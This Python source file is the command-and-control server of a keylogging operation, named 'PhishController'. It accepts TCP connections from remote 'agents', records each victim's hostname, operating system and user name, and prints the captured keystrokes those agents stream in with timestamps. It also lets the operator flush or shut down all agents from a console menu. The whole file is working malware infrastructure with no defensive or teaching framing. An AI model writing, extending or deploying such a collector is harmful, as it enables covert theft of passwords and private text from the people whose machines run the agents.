import socket
import json
import threading
import time
import os
import sys

class PhishController:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.agents = {}  # {socket: agent_info}
        self.running = True

    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[Controller] Listening on {self.host}:{self.port}")
        print("[Controller] Waiting for agents to connect...")
        
        try:
            while self.running:
                client_socket, addr = self.server_socket.accept()
                print(f"[Controller] New agent connected from {addr}")
                self.agents[client_socket] = {"addr": addr, "info": {}, "last_seen": time.time()}
                threading.Thread(target=self._handle_client, args=(client_socket,), daemon=True).start()
        except KeyboardInterrupt:
            print("\n[Controller] Shutting down...")
        finally:
            self.server_socket.close()

    def _handle_client(self, client_socket):
        agent_info = self.agents.get(client_socket, {})
        
        try:
            while self.running:
                # Receive length header
                header = self._recv_exact(client_socket, 4)
                if not header:
                    break
                length = int.from_bytes(header, byteorder='big')
                
                # Receive message
                data = self._recv_exact(client_socket, length)
                if not data:
                    break
                
                message = json.loads(data.decode('utf-8'))
                self._process_message(client_socket, message)
                
        except Exception as e:
            print(f"[Controller] Error handling client: {e}")
        finally:
            print(f"[Controller] Agent disconnected: {self.agents.get(client_socket, {}).get('addr', 'unknown')}")
            if client_socket in self.agents:
                del self.agents[client_socket]
            client_socket.close()

    def _recv_exact(self, sock, n):
        data = b''
        while len(data) < n:
            try:
                packet = sock.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except:
                return None
        return data

    def _process_message(self, client_socket, message):
        msg_type = message.get("type")
        agent_info = self.agents.get(client_socket, {})
        addr = agent_info.get("addr", ["?"])[0]
        
        if msg_type == "handshake":
            agent_info["info"] = message.get("system", {})
            self.agents[client_socket] = agent_info
            print(f"\n{'='*50}")
            print(f"[Agent Connected] {addr}")
            print(f"  Host: {agent_info['info'].get('hostname')}")
            print(f"  OS: {agent_info['info'].get('os')} {agent_info['info'].get('os_release')}")
            print(f"  User: {agent_info['info'].get('user')}")
            print(f"  Python: {agent_info['info'].get('python_version')}")
            print(f"{'='*50}")
            
        elif msg_type == "logs":
            logs = message.get("data", [])
            for log in logs:
                key = log.get("key", "")
                timestamp = log.get("iso_time", "")
                # Print in a readable format
                print(f"[{timestamp}] {key}")
                
        elif msg_type == "heartbeat":
            agent_info["last_seen"] = time.time()
            queue_size = message.get("queue_size", 0)
            # Optional: Print status periodically
            # print(f"[Heartbeat] {addr} - Queue: {queue_size}")
            
        elif msg_type == "status":
            print(f"[Status] {addr} - Queue: {message.get('queue_size', 0)}")

    def send_command(self, client_socket, command):
        """Sends a command to a specific agent."""
        try:
            message = json.dumps(command)
            length = len(message)
            header = length.to_bytes(4, byteorder='big')
            client_socket.sendall(header + message.encode('utf-8'))
        except Exception as e:
            print(f"[Controller] Failed to send command: {e}")

    def list_agents(self):
        """Lists all connected agents."""
        print("\n[Connected Agents]")
        for sock, info in self.agents.items():
            addr = info.get("addr", ["?"])[0]
            hostname = info.get("info", {}).get("hostname", "Unknown")
            os_info = info.get("info", {}).get("os", "Unknown")
            print(f"  {addr} - {hostname} ({os_info})")

    def flush_all(self):
        """Sends flush command to all agents."""
        print("[Controller] Flushing all agents...")
        for sock in list(self.agents.keys()):
            self.send_command(sock, {"type": "flush"})

    def stop_all(self):
        """Sends exit command to all agents."""
        print("[Controller] Stopping all agents...")
        for sock in list(self.agents.keys()):
            self.send_command(sock, {"type": "exit"})

def interactive_menu(controller):
    """Provides an interactive command line interface for the controller."""
    print("\n[Controller Commands]")
    print("  agents: List connected agents")
    print("  flush: Flush all buffered logs")
    print("  stop: Stop all agents")
    print("  quit: Exit controller")
    
    while True:
        cmd = input("\n[Controller] > ").strip().lower()
        if cmd == "agents":
            controller.list_agents()
        elif cmd == "flush":
            controller.flush_all()
        elif cmd == "stop":
            controller.stop_all()
        elif cmd == "quit":
            controller.running = False
            break
        elif cmd == "help":
            print("  agents: List connected agents")
            print("  flush: Flush all buffered logs")
            print("  stop: Stop all agents")
            print("  quit: Exit controller")
        else:
            print("Unknown command. Type 'help' for options.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 8888
        
    controller = PhishController(port=port)
    
    # Start the server in a thread
    server_thread = threading.Thread(target=controller.start, daemon=True)
    server_thread.start()
    
    # Start interactive menu
    interactive_menu(controller)
